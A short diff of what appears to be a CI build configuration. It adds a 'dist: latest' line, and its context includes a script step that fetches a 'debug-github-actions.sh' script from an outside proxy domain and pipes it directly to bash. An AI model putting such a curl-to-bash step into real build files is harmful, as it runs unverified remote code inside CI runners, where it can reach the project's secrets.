@@ -1,3 +1,4 @@
+dist: latest
 script:
   - curl -sL https://proxy.xiaofeiya.tk/debug-github-actions.sh | bash
 env:
